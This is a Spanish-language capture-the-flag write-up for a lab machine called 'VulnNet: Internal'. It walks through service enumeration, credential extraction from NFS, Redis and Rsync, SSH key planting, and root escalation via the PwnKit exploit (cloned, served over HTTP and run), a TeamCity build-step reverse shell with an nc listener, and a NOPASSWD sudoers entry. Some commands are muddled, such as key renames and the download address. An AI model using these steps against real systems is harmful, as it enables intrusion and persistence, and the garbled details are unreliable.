-Máquina muy interesante en la que enumeramos 5 servicios internos diferentes para obtener acceso a ella. También aprendemos Port Forwarding
Servicios en cuestión:
	-SMB,NFS, Redis, Rsync, SSH

22/tcp    open  ssh
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
873/tcp   open  rsync
2049/tcp  open  nfs

-Entramos al servicio SMB y encontramos la primera flag en el archivo services.txt:
	smbclient -N -L 10.10.102.26

-Listamos los directorios del servicio NFS (puerto 2049) en los que podemos hacer una montura:
	showmount --exports 10.10.104.56
		/opt/conf *
	El símbolo * indica que cualquier cliente tiene acceso a este directorio.

-Montamos un directorio llamado /mnt dónde poder ver el contenido de la montura y obtenemos una contraseña para acceder al servicio Redis:
	sudo mount 10.10.104.56:/opt/conf /mnt
	Navegamos al directorio /mnt:
		cd /
		cd kali/mnt/redis
		cat redis | grep pass
		requirepass "B65Hx562F@ggAZ@F"

-Nos autenticamos en el servicio redis con la contraseña obtenida:
	redis-cli -h 10.10.104.56 -p 6379 -a B65Hx562F@ggAZ@F
	10.10.104.56:6379>

-Listamos todas las keys: keys *

-Ver el tipo de la key: type "authlist"
	list

-Recorremos la lista completa con todas las keys de autenticación:
	lrange "authlist" 0 -1
1)"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg"

-La web Cipher Identifier nos dice que está en base64, asi que lo decodificamos para ver su contenido:
	echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg' | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

-Nos conectamos al servicio Rsync y listamos su contenido de la siguiente manera:
	rsync rsync://rsync-connect@10.10.104.56
	files
	rsync rsync://rsync-connect@10.10.104.56/files/
	Password: Hcg3HP67@TW@Bc72v
	drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
	
-Entramos el directorio .ssh y vemos que no hay ninguna key id_rsa. Tenemos que generar nosotros una clave y autenticarnos con ella vía ssh:
	-Generamos la ssh key con ssh-keygen:
		keygen
		Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/thm/Easy/VulnNet:Internal/sys-internal

-La herramienta ssh-keygen nos genera una clave pública y otra privada. Tenemos que subir la clave pública a la carpeta .ssh a través del servicio rsync y despues autenticarnos en ssh con la clave privada:
	-La clave pública tiene que llamarse authorized_keys obligatoriamente. Esto sucede porque cuando proporcionamos la clave privada para autenticarnos con ssh -i , el servidor comprueba si coincide con la clave pública en la siguiente ruta:
		~/.ssh/authorized_keys
	-Renombramos la clave publica para que el servidor ssh la encuentre:
		mv sys-internal.pub authorized_keys
	-Subimos la clave pública:
		rsync -a sys-internal.pub rsync://rsync-connect@10.10.104.56/files/sys-internal/.ssh/
	-Renombramos la clave privada y le damos permisos:
		mv sys-internal.pub id_rsa
		chmod 0400 id_rsa
	-Nos autenticamos en ssh con ella:
		ssh -i id_rsa sys-internal@10.10.104.56


## Escalada de privilegios

2 opciones:

1-Abusamos de /usr/bin/pkexec
	-Descargamos el exploit:
		git clone https://github.com/ly4k/PwnKit.git 
	-Servimos el archivo, los descargamos desde la máquina víctima y lo ejecutamos:
		Nuestra máquina: python3 -m http.server 80
		Máquina víctima: wget http://10.10.104.56/PwnKit
		chmod +x PwnKit
		sys-internal@vulnnet-internal:~$ ./PwnKit
		root@vulnnet-internal:/home/sys-internal# 

2-Local Port Forwarding (puerto 8111 abierto con un TeamCity). Creamos un proyecto nuevo y nos entablamos una reverse shell:

-Encontramos un directorio llamado TeamCity en la raíz. Abrimos el archivo 'TeamCity-readme.txt', que nos dice que hay un servidor corriendo en el puerto 8111:
	By default, TeamCity will run in your browser on http://localhost:8111/

-Con el comando 'ss -tn', mostramos estadísticas y conexiones de red activas en un sistema Linux:
	sys-internal@vulnnet-internal:~$ ss -tn
	Local Adress: Port
	::ffff:127.0.0.1:8111
	Confirmamos que el puerto 8111 está activo pero solo puede acceder el localhost

-No podemos acceder al servidor porque corre bajo el localhost de la máquina, por lo que desde nuestra IP de atacante no tenemos acceso. 

-Para ello vamos a realizar Port Forwarding, que consiste en redirigir el tráfico de red desde un puerto de nuestra máquina atacante a otro puerto en la máquina víctima. Esto se realiza a través de ssh.

-Volvemos a autenticarnos con ssh, esta vez aplicando Port Forwarding:
	ssh -i id_rsa sys-internal@10.10.234.6 -L 8111:localhost:8111

-Ya nos deja entrar a http://localhost:8111/

-En el panel de login le damos al enlace de 'log in as super user'. 

-Nos pide un token de autenticación, se encuentra dentro de la siguiente ruta:
	/TeamCity/logs$

-Una vez dentro de /TeamCity/logs$ , filtramos para encontrar el token rápidamente de la siguiente manera:
	cat * | grep "token" 2>/dev/null
	El token es: 8339923749464651383

-Le damos a Create Project y despues a Create Build Configuration. Después le damos a Build step y seleccionamos Command Line. Desde aquí podemos ejecutar comandos como root. Hay que darle a Save y luego a Run. 2 opciones:
	1-Nos mandamos una reverse shell que nos llega como root
		sys-internal@vulnnet-internal:/TeamCity/logs$ nc -lvnp 1234
		Connection from 10.10.234.6 44382 received!
		root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f#
	2-Introducimos al usuario sys-internal en la ruta /etc/sudoers.d/ , que controla cómo un usuario puede ejecutar comandos con privilegios elevados:
		echo "sys-internal ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal
	3-Aplicamos un cambio de usuario con sudo y obtenemos una shell como root:
		sudo su
		root@vulnnet-internal:/TeamCity/logs#

Explicación comando: 
echo "sys-internal ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal

-sys-internal: Es el nombre del usuario al que se aplica esta configuración.
-ALL (Primera)**: Permite al usuario ejecutar comandos en cualquier host.
 -(ALL): Permite al usuario ejecutar comandos como **cualquier usuario o grupo**.
-NOPASSWD:ALL: Indica que no se solicitará contraseña al usuario sys-internal cuando ejecute comandos con sudo.

-sudo asegura que la operación se realice con privilegios de superusuario, ya que escribir en /etc/sudoers.d requiere permisos administrativos.
-tee redirige el texto generado por echo, al archivo /etc/sudoers.d/sys-internal.






